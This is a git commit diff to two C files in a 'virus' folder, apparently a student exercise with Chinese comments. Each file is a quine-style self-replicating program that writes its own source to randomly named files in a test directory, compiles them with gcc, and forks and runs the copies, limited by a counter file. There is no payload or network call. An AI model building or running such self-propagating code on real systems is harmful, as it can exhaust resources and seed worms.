c144f4f9b447b0d7b20c1a630b6c9e41877fb712
BugsAway <47944780+BugsAway@users.noreply.github.com>
2020-03-19 13:34:57 +0800

    1
    1

--- virus/virus1.c
+++ virus/virus1.c
@@ -7,7 +7,13 @@
 #include <signal.h>
 #include <sys/file.h>
 #include <pthread.h>
-void ssrand(char *s)
+
+
+/*
+生成26个随机数
+
+ */
+void random_number(char *s)
 {
 	int i;
 	for(i=0;i<5;i++)
@@ -22,34 +28,34 @@ void ssrand(char *s)
 int main(int argc, char const *argv[])
 {
 	srand((unsigned)time(NULL));
-	pthread_rwlock_t rwlock;	
-	char temp[100];	
-	char source[100]="/home/sweetjiuce/test/";
+	
+	char Te[100];	
+	char source[100]="/home/cyz/test/";
 	char gc[100]="gcc ";
   	while(1)
   	{
   		memset(source,0,100);
   		memset(gc,0,100);
-  		strcpy(source,"/home/sweetjiuce/test/");
+  		strcpy(source,"/home/cyz/test/");
   		strcpy(gc,"gcc ");
-	    //source[100]="/home/sweetjiuce/test/";
+	    //source[100]="/home/cyz/test/";
 	    char string_rand[10];
-	    ssrand(string_rand);
+	    random_number(string_rand);
 	    strcat(source,string_rand);
-	   // gc[100]="gcc ";	
-		strcat(gc,source);
+	
+		  strcat(gc,source);
 	    FILE *fp=freopen(source,"r+",stdout); 
 	    if(fp!=NULL)
 	      continue;
 	  	else
 	  		break;
  	}
- 	FILE *fp=freopen(source,"w+",stdout); 
-    FILE *f=fopen("/home/sweetjiuce/num.txt","r+");
-    while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);
+ 	  FILE *fp=freopen(source,"w+",stdout); 
+    FILE *f=fopen("/home/cyz/num.txt","r+");
+   
 
-    fgets(temp,100,f);  
-    int num=atoi(temp); 	
+    fgets(Te,100,f);  
+    int num=atoi(Te); 	
     if(num==0)
     {
     	exit(0);
@@ -58,25 +64,25 @@ int main(int argc, char const *argv[])
     {
    		num--;
    	}
-   	flock(fileno(f),LOCK_UN);
+   	
     fclose(f);
-    FILE *f1=fopen("/home/sweetjiuce/num.txt","w");
-    while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);
+    FILE *f1=fopen("/home/cyz/num.txt","w");
+   
     fprintf(f1, "%d", num);
-    flock(fileno(f),LOCK_UN);
+   
    	fclose(f1);
    	int pid=fork();
     char *str="#include <stdio.h>%c#include <sys/file.h>%c#include<pthread.h>%c#include <signal.h>%c\
     #include <sys/types.h>%c#include <string.h>%c#include <stdlib.h>%c#include <time.h>%c#include <unistd.h>%c\
-    void ssrand(char *s){int i;for(i=0;i<5;i++){s[i]=rand()%26+'a';}s[i]='.';s[i+1]='c';s[i+2]=0;}%c\
+    void random_number(char *s){int i;for(i=0;i<5;i++){s[i]=rand()%26+'a';}s[i]='.';s[i+1]='c';s[i+2]=0;}%c\
     int main(int argc, char const *argv[])%c\
-    {%cpthread_rwlock_t rwlock;srand((unsigned)time(NULL));char temp[100];char gc[100]=%cgcc %c;char source[100]=%c/home/sweetjiuce/test/%c;\
-    while(1){memset(source,0,100);memset(gc,0,100);strcpy(source,%c/home/sweetjiuce/test/%c);char string_rand[10];ssrand(string_rand);\
+    {%cpthread_rwlock_t rwlock;srand((unsigned)time(NULL));char Te[100];char gc[100]=%cgcc %c;char source[100]=%c/home/cyz/test/%c;\
+    while(1){memset(source,0,100);memset(gc,0,100);strcpy(source,%c/home/cyz/test/%c);char string_rand[10];random_number(string_rand);\
    	strcat(source,string_rand);strcpy(gc,%cgcc %c);	strcat(gc,source);FILE *fp=freopen(source,%cr+%c,stdout);\
    	if(fp!=NULL)continue;else break;} 	FILE *fp=freopen(source,%cw+%c,stdout); \
-	FILE *f=fopen(%c/home/sweetjiuce/num.txt%c,%cr+%c);while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);\
-    fgets(temp,100,f);int num=atoi(temp);if(num==0){exit(0);%c}else{num--;}flock(fileno(f),LOCK_UN);fclose(f);\
-    FILE *f1=fopen(%c/home/sweetjiuce/num.txt%c,%cw%c);while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);fprintf(f1, %c%cd%c, num);flock(fileno(f),LOCK_UN);\
+	FILE *f=fopen(%c/home/cyz/num.txt%c,%cr+%c);while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);\
+    fgets(Te,100,f);int num=atoi(Te);if(num==0){exit(0);%c}else{num--;}flock(fileno(f),LOCK_UN);fclose(f);\
+    FILE *f1=fopen(%c/home/cyz/num.txt%c,%cw%c);while(flock(fileno(f),LOCK_EX | LOCK_NB)!=0);fprintf(f1, %c%cd%c, num);flock(fileno(f),LOCK_UN);\
     fclose(f1);int pid=fork();\
     char *str = %c%s%c;%c\
     printf(str,10,10,10,10,10,10,10,10,10,10,10,10,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,10,34,34,34,34,34,37,34,34,str,34,10,34,34,34,34,10,10);if(pid==0){system(gc);\
--- virus/virus2.c
+++ virus/virus2.c
@@ -6,11 +6,22 @@
 #include <string.h>
 #include <signal.h>
 int flag=0;
+
+/*
+判断信号的到来
+
+
+ */
 void Flag(int sig)
 {
   flag=1;
 }
-void ssrand(char *s)
+
+/*
+
+生成随机字母
+ */
+void random_number(char *s)
 {
 	int i;
 	for(i=0;i<5;i++)
@@ -21,18 +32,23 @@ void ssrand(char *s)
 	s[i+1]='c';
 	s[i+2]=0;
 }
+
+/*
+
+每当有信号到来的时候。处理这个函数
+ */
 void SIG(int signo)
 {
   if(signo == 1)
   {  
     while(1)
     {
-      char out[100]="/home/sweetjiuce/test";
+      char out[100]="/home/cyz/test";
       char gc[100]="gcc ";
-      char sourc[100]="/home/sweetjiuce/test/";
-      char source[100]="/home/sweetjiuce/test/";
+      char sourc[100]="/home/cyz/test/";
+      char source[100]="/home/cyz/test/";
       char string_rand[10];
-      ssrand(string_rand);
+      random_number(string_rand);
       strcat(source,string_rand);
       FILE *fp=freopen(source,"r+",stdout);
       if(fp!=NULL)
@@ -42,18 +58,18 @@ void SIG(int signo)
         FILE *fp=freopen(source,"w+",stdout);
         strcat(gc,source);
         char *str="#include <stdio.h>%c#include <sys/types.h>%c#include <signal.h>%c#include <string.h>%c#include <stdlib.h>%c#include <time.h>%c#include <unistd.h>%c\
-        int flag=0;void ssrand(char *s){int i;for(i=0;i<5;i++){s[i]=rand()%26+'a';}s[i]='.';s[i+1]='c';s[i+2]=0;}%cvoid Flag(int sig){flag=1;}%c\
+        int flag=0;void random_number(char *s){int i;for(i=0;i<5;i++){s[i]=rand()%26+'a';}s[i]='.';s[i+1]='c';s[i+2]=0;}%cvoid Flag(int sig){flag=1;}%c\
         void SIG(int signo){if(signo == 1){\
-        while(1){char out[100]=%c/home/sweetjiuce/test%c;char sourc[100]=%c/home/sweetjiuce/test/%c;char gc[100]=%cgcc %c;char source[100]=%c/home/sweetjiuce/test/%c;\
-        char string_rand[10];ssrand(string_rand);strcat(source,string_rand);FILE *fp=freopen(source,%cr+%c,stdout); \
+        while(1){char out[100]=%c/home/cyz/test%c;char sourc[100]=%c/home/cyz/test/%c;char gc[100]=%cgcc %c;char source[100]=%c/home/cyz/test/%c;\
+        char string_rand[10];random_number(string_rand);strcat(source,string_rand);FILE *fp=freopen(source,%cr+%c,stdout); \
         if(fp!=NULL)continue;else {FILE *fp=freopen(source,%cw+%c,stdout);strcat(gc,source);char *str = %c%s%c;%c\
         printf(str,10,10,10,10,10,10,10,10,10,34,34,34,34,34,34,34,34,34,34,34,34,34,str,34,10,34,34,34,34,10,10,10,10,34,34,34,34,34,34,10,34,34,34,34,34,37,34,10,10);fclose(fp);\
         system(gc);execlp(%c./a.out%c, %c./a.out%c,(char*)0);break;%c}}}}%c\
         int main(int argc, char const *argv[])%c\
-        {%cchar source[100]=%c/home/sweetjiuce/test/%c;srand((unsigned)time(NULL));char temp[100];\
-        FILE *f=fopen(%c/home/sweetjiuce/num.txt%c,%cr+%c);\
-        fgets(temp,100,f);int num=atoi(temp);if(num==0){exit(0);%c}else{num--;}fclose(f);\
-        FILE *f1=fopen(%c/home/sweetjiuce/num.txt%c,%cw%c);fprintf(f1, %c%cd%c, num);\
+        {%cchar source[100]=%c/home/cyz/test/%c;srand((unsigned)time(NULL));char Te[100];\
+        FILE *f=fopen(%c/home/cyz/num.txt%c,%cr+%c);\
+        fgets(Te,100,f);int num=atoi(Te);if(num==0){exit(0);%c}else{num--;}fclose(f);\
+        FILE *f1=fopen(%c/home/cyz/num.txt%c,%cw%c);fprintf(f1, %c%cd%c, num);\
         fclose(f1);int pid=fork();sigset_t set;sigemptyset(&set);sigprocmask(SIG_SETMASK,&set,NULL);signal(SIGINT,Flag);if(pid==0){while(flag!=1){pause();}SIG(1);}%creturn 0;%c}";   
         printf(str,10,10,10,10,10,10,10,10,10,34,34,34,34,34,34,34,34,34,34,34,34,34,str,34,10,34,34,34,34,10,10,10,10,34,34,34,34,34,34,10,34,34,34,34,34,37,34,10,10);
         fclose(fp);
@@ -69,11 +85,11 @@ int main(int argc, char const *argv[])
 {
     
 	  srand((unsigned)time(NULL));
-    char temp[100];
+    char Te[100];
    
-    FILE *f=fopen("/home/sweetjiuce/num.txt","r+");
-    fgets(temp,100,f);
-    int num=atoi(temp);
+    FILE *f=fopen("/home/cyz/num.txt","r+");
+    fgets(Te,100,f);
+    int num=atoi(Te);//将字符型转换成整形
     if(num==0)
     {
     	exit(0);
@@ -83,7 +99,7 @@ int main(int argc, char const *argv[])
    		num--;
    	}
     fclose(f);
-    FILE *f1=fopen("/home/sweetjiuce/num.txt","w");   
+    FILE *f1=fopen("/home/cyz/num.txt","w");   
     fprintf(f1, "%d", num);
    	fclose(f1);
     
